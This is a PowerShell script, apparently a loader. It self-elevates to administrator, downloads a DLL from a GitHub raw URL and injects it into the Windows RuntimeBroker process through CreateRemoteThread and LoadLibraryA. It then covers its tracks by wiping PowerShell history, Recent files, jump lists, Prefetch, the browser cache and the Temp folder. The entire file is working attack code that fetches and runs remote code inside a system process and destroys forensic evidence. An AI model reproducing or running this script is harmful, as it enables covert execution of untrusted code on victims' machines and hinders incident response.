# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-NoExit",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        exit 1
    }
}

# === CONFIG ===
$DLL_URL = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main/Nova.dll"
$PROC_NAME = "RuntimeBroker"

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# === Download Assets (Images) ===
$tempDir = $env:TEMP
$rawBaseUrl = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main"

$assets = @(
    @{Name="logo.png"; Url="$rawBaseUrl/logo.png"},
    @{Name="low.png"; Url="$rawBaseUrl/low.png"},
    @{Name="medium.png"; Url="$rawBaseUrl/medium.png"},
    @{Name="high.png"; Url="$rawBaseUrl/high.png"}
)

foreach ($asset in $assets) {
    try {
        $dest = Join-Path $tempDir $asset.Name
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($asset.Url, $dest)
        $wc.Dispose()
    }
    catch {
        # Silent fail
    }
}

# === Win32 API via P/Invoke ===
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NativeAPI
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr,
        uint size, uint allocType, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr addr,
        uint size, uint freeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddr,
        byte[] buffer, uint size, out int written);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attrs,
        uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out IntPtr tid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandleA(string moduleName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
    public const uint MEM_COMMIT  = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint MEM_RELEASE = 0x00008000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint INFINITE = 0xFFFFFFFF;
}
"@
} catch {}

# === STEP 1: Download DLL ===
$dllBytes = $null
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "WindowsPowerShell/5.0")
    $dllBytes = $wc.DownloadData($DLL_URL)
} catch {
    exit 1
}

# === STEP 2: Find target process ===
$proc = $null
for ($i = 0; $i -lt 60; $i++) {
    $proc = Get-Process -Name $PROC_NAME -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) { break }
    Start-Sleep -Seconds 1
}

if (-not $proc) {
    exit 1
}

# === STEP 3: Open process ===
$procId = $proc.Id
$hProc = [NativeAPI]::OpenProcess([NativeAPI]::PROCESS_ALL_ACCESS, $false, $procId)

if ($hProc -eq [IntPtr]::Zero) {
    exit 1
}

# === Allocate memory for DLL bytes in remote process ===
$dllSize = [uint32]$dllBytes.Length
$remoteMem = [NativeAPI]::VirtualAllocEx(
    $hProc, [IntPtr]::Zero, $dllSize,
    ([NativeAPI]::MEM_COMMIT -bor [NativeAPI]::MEM_RESERVE),
    [NativeAPI]::PAGE_EXECUTE_READWRITE
)

if ($remoteMem -eq [IntPtr]::Zero) {
    [NativeAPI]::CloseHandle($hProc)
    exit 1
}

# === Write DLL bytes to remote process ===
$written = 0
$writeOk = [NativeAPI]::WriteProcessMemory($hProc, $remoteMem, $dllBytes, $dllSize, [ref]$written)

if (-not $writeOk) {
    [NativeAPI]::VirtualFreeEx($hProc, $remoteMem, 0, [NativeAPI]::MEM_RELEASE)
    [NativeAPI]::CloseHandle($hProc)
    exit 1
}

# === LoadLibraryA Injection ===
$k32 = [NativeAPI]::GetModuleHandleA("kernel32.dll")
$loadLib = [NativeAPI]::GetProcAddress($k32, "LoadLibraryA")

# Write DLL to concealed temp path
$tempName = [System.IO.Path]::GetTempPath() + [Guid]::NewGuid().ToString("N").Substring(0, 8) + ".tmp"
[System.IO.File]::WriteAllBytes($tempName, $dllBytes)

# Write path string to remote process
$pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempName + "`0")
$remoteStr = [NativeAPI]::VirtualAllocEx(
    $hProc, [IntPtr]::Zero, [uint32]$pathBytes.Length,
    ([NativeAPI]::MEM_COMMIT -bor [NativeAPI]::MEM_RESERVE),
    [NativeAPI]::PAGE_READWRITE
)

$w2 = 0
[NativeAPI]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, [uint32]$pathBytes.Length, [ref]$w2) | Out-Null

# CreateRemoteThread -> LoadLibraryA(dllPath)
$tid = [IntPtr]::Zero
$hThread = [NativeAPI]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $loadLib, $remoteStr, 0, [ref]$tid)

if ($hThread -eq [IntPtr]::Zero) {
    Remove-Item $tempName -Force -ErrorAction SilentlyContinue
    [NativeAPI]::CloseHandle($hProc)
    exit 1
}

# Wait for thread to complete (DLL loaded)
[NativeAPI]::WaitForSingleObject($hThread, 5000) | Out-Null

# === STEP 4: Clean up ===
Start-Sleep -Milliseconds 500
try { Remove-Item $tempName -Force -ErrorAction Stop } catch {}

# Overwrite the path in remote memory with zeros
try {
    $zeros = New-Object byte[] $pathBytes.Length
    [NativeAPI]::WriteProcessMemory($hProc, $remoteStr, $zeros, [uint32]$zeros.Length, [ref]$w2) | Out-Null
    [NativeAPI]::VirtualFreeEx($hProc, $remoteStr, 0, [NativeAPI]::MEM_RELEASE) | Out-Null
} catch {}

# Free the raw DLL bytes region
try {
    [NativeAPI]::VirtualFreeEx($hProc, $remoteMem, 0, [NativeAPI]::MEM_RELEASE) | Out-Null
} catch {}

# Clean up handles
[NativeAPI]::CloseHandle($hThread) | Out-Null
[NativeAPI]::CloseHandle($hProc) | Out-Null

# Clear variables from memory
$dllBytes = $null
$pathBytes = $null
[GC]::Collect()

# Clear PowerShell History
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

# Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# Clear Prefetch
$prefetchPath = "C:\Windows\Prefetch"
if (Test-Path $prefetchPath) {
    Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
}

# Clear INetCache
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# Clear Temp Folder
$tempDir = $env:TEMP
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# === Output Success ===
Write-Host "success"
